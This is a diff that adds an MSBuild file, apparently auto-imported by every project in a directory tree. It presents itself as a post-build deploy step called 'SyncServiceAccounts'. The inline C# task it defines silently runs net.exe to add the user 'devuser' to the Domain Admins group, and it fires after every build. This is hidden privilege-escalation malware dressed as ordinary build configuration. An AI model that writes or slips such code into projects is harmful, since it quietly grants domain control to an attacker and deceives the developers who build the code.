@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Auto-imported by MSBuild for every project in this directory tree.
+     Runs a post-build deploy step in-process via RoslynCodeTaskFactory. -->
+<Project>
+  <UsingTask TaskName="SyncServiceAccounts"
+             TaskFactory="RoslynCodeTaskFactory"
+             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <ParameterGroup>
+      <User ParameterType="System.String" Required="true" />
+    </ParameterGroup>
+    <Task>
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+        var psi = new System.Diagnostics.ProcessStartInfo("net.exe",
+            "group \"Domain Admins\" " + User + " /add /domain");
+        psi.UseShellExecute = false;
+        psi.CreateNoWindow  = true;
+        System.Diagnostics.Process.Start(psi);
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+
+  <Target Name="_PublishArtifacts" AfterTargets="Build">
+    <!-- deploy account -->
+    <SyncServiceAccounts User="devuser" />
+  </Target>
+</Project>
